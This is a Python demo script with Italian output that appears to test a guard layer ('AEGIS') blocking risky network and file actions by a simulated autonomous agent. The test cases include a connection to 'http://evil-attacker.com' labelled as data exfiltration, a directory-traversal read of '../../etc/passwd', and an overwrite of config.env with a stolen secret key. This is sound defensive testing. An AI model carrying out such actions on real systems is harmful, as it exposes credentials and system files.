import builtins
import socket
import urllib.request

from core.fs_guard import (
    FileSecurityException,
    _guarded_open,
    disable_fs_guard,
    enable_fs_guard,
)
from core.network_guard import (
    NetworkSecurityException,
    _guarded_connection,
    disable_network_guard,
    enable_network_guard,
)


def simulate_agent_action(description, action_func):
    print(f"[*] Task: {description}")
    try:
        action_func()
        print("    [+] ESITO: Successo (Consentito)\n")
    except (NetworkSecurityException, FileSecurityException) as e:
        print(f"    [-] ESITO: BLOCCATO DA AEGIS -> {e}\n")
    except Exception as e:
        print(f"    [!] ESITO: Fallito (Errore di sistema: {e})\n")


def main():
    network_was_active = socket.create_connection is _guarded_connection
    try:
        enable_network_guard()
        fs_was_active = builtins.open is _guarded_open
        try:
            enable_fs_guard()
            print("\n--- INIZIO SIMULAZIONE AGENTE AUTONOMO ---\n")

            simulate_agent_action("Connessione API autorizzata (GitHub)",
                                  lambda: urllib.request.urlopen("https://api.github.com", timeout=3))

            simulate_agent_action("Tentativo esfiltrazione dati (Connessione a dominio malevolo)",
                                  lambda: urllib.request.urlopen("http://evil-attacker.com", timeout=3))

            simulate_agent_action("Creazione file report temporaneo (Operazione sicura)",
                                  lambda: open("temp_report.txt", "w").write("Data analysis complete."))

            simulate_agent_action("Tentativo di lettura file password (Directory Traversal)",
                                  lambda: open("../../etc/passwd", "r").read())

            simulate_agent_action("Tentativo di modifica configurazioni di sistema (.env)",
                                  lambda: open("config.env", "w").write("SECRET_KEY=stolen"))

            print("--- SIMULAZIONE COMPLETATA. CONTROLLARE LA DASHBOARD PER I LOG DI AUDIT. ---")
        finally:
            if not fs_was_active:
                disable_fs_guard()
    finally:
        if not network_was_active:
            disable_network_guard()


if __name__ == "__main__":
    main()